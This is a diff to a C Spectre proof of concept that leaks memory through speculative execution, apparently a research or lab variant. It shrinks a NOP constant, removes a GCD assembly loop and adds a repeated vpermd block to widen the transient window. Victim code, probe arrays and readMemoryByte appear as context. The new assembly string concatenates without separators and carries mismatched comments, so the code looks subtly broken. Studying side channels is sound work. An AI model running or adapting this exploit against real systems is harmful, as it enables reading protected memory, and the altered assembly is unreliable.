@@ -10,7 +10,7 @@
 #endif
 #define STR(x) #x
 #define XSTR(s) STR(s)
-#define NOP_SIZE 1000000 /* number of instructions that will be added to the transient window */
+#define NOP_SIZE 500 /* number of instructions that will be added to the transient window */
 
 /********************************************************************
 Victim code.
@@ -21,7 +21,6 @@ uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t array2[256 * 512]; // = 131072 = 4096 * 32
 char *secret = "This code uses the Spectre vulnerability to access kernel memory";
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
-
 void victim_function(size_t x)
 {
     if (x < array1_size)
@@ -43,25 +42,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
     size_t training_x, x;
     register uint64_t time1, time2;
     volatile uint8_t *addr;
-    int result;
-    // GCD
-    for (i = 0; i < 500000; i++)
-    {
-        int a = rand();
-        int b = rand();
-        __asm__ __volatile__("movl %1, %%eax;"
-                             "movl %2, %%ebx;"
-                             "CONTD: cmpl $0, %%ebx;"
-                             "je DONE;"
-                             "xorl %%edx, %%edx;"
-                             "idivl %%ebx;"
-                             "movl %%ebx, %%eax;"
-                             "movl %%edx, %%ebx;"
-                             "jmp CONTD;"
-                             "DONE: movl %%eax, %0;"
-                             : "=g"(result)
-                             : "g"(a), "g"(b));
-    }
+    __asm__(".rept" XSTR(NOP_SIZE)       // mov %rax, (%rdi)
+            "vpermd %ymm0, %ymm1, %ymm0" // add $8, %rdi
+            "vpermd %ymm2, %ymm3, %ymm2" // dec %rcx
+            "vpermd %ymm4, %ymm5, %ymm4" // jnz 1b
+            ".endr");
 
     for (i = 0; i < 256; i++)
         results[i] = 0;
